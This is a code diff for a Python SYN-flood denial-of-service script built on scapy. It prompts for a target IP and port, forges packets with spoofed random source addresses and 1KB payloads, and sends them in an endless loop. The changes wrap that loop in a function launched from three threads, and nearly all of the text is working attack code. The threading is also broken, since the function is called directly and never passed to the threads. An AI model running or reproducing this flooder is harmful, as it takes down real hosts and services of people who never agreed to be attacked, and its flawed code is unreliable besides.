@@ -1,6 +1,11 @@
-import keyboard
 from scapy.all import *
 
+def send_packet(target_ip, target_port):
+    ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
+    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+    raw = Raw(b"X"*1024)
+    p = ip / tcp / raw
+    send(p, loop=1, verbose=0)
 
 if __name__ == "__main__":
     while True:
@@ -14,24 +19,16 @@ if __name__ == "__main__":
         print(f" \______/     |__/    |__/  \__//$$$$$$|__/      |__/ \______/  \______/  \_______/")
         print(f"                               |______/                                            made by D00MTrooper ")
 
-
-        #target import ipdb
         target_ip = input("Choose IP: ")
-        #port you want to flood
         target_port = int(input("Choose port: "))
 
-        #________________________________________________________________________
+        print(f"Atack started")
 
-        ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
-        # forge a TCP SYN packet with a random source port
-        # and the target port as the destination port
-        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
-        # add some flooding data (1KB in this case)
-        raw = Raw(b"X"*1024)
-        # stack up the layers
-        p = ip / tcp / raw
+        thread1 = threading.Thread(target=send_packet(target_ip, target_port))
+        thread1.start()
 
-        #________________________________________________________________________
+        thread2 = threading.Thread(target=send_packet(target_ip, target_port))
+        thread2.start()
 
-        # send the constructed packet in a loop until CTRL+C is detected
-        send(p, loop=1, verbose=0)
+        thread3 = threading.Thread(target=send_packet(target_ip, target_port))
+        thread3.start()
